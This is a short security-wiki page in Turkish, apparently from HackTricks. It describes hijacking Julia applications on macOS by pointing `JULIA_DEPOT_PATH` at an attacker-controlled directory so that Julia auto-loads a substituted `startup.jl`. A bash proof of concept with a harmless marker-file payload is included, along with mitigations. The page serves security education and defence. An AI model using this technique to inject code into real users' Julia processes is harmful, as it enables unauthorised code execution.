# macOS Julia Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `JULIA_DEPOT_PATH` ve `startup.jl`

Julia, başlangıçta normalde ilk depot'undaki `config/startup.jl` dosyasını çalıştırır. `JULIA_DEPOT_PATH` depot listesini kontrol eder; bu nedenle onu saldırganın okuyabildiği bir ağaç yapısına yönlendirmek, otomatik olarak yüklenen başlangıç dosyasını başka bir dosyayla değiştirir.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```
Sondaki ayırıcı, victim'ın normal paketlerine hâlâ ihtiyaç duyduğu durumlarda kullanışlıdır. `julia --startup-file=no` bu başlangıç dosyasını devre dışı bırakır. Başlatmadan önce değişkeni temizleyin; çünkü bu değişken package registry'lerini, environment'ları, cache'leri ve code-loading konumlarını da kontrol eder.

## References

- [1] [Julia command-line interface: Başlangıç dosyası](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [2] [Julia environment variables: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
{{#include ../../../banners/hacktricks-training.md}}
